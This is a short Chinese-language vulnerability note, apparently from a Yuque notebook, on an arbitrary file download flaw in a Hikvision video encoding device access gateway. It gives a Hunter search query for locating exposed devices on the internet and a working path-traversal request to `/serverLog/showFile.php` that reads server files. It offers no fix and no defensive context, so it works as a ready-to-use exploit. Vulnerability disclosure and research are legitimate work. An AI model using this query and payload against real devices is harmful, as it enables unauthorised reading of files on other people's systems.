# 海康威视视频编码设备接入网关 showFile.php 任意文件下载漏洞

# 一、漏洞简介
海康威视视频接入网关系统在页面`/serverLog/showFile.php`的参数fileName存在任意文件下载漏洞

# 二、影响版本
+ HIKVISION 视频编码设备接入网关

# 三、资产测绘
+ hunter：`web.title="视频编码设备接入网关"&&app.name=="Hikvision 海康威视视频编码设备接入网关"`

![1691857505004-d8663f3c-62e3-4cac-8909-21305e690fea.png](./img/yRD1Rk7vrCTRxiTa/1691857505004-d8663f3c-62e3-4cac-8909-21305e690fea-234903.png)

+ 登录页面

![1691857519082-eb318732-d51e-4393-89a9-7296293727ba.png](./img/yRD1Rk7vrCTRxiTa/1691857519082-eb318732-d51e-4393-89a9-7296293727ba-690646.png)

# 四、漏洞复现
```plain
/serverLog/showFile.php?fileName=../web/html/main.php
```

![1691857555317-62dd3fcc-287a-40ea-9cb0-6f4d7a94351e.png](./img/yRD1Rk7vrCTRxiTa/1691857555317-62dd3fcc-287a-40ea-9cb0-6f4d7a94351e-655220.png)



> 更新: 2024-02-29 23:57:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mq89stc9hxmf3fw1>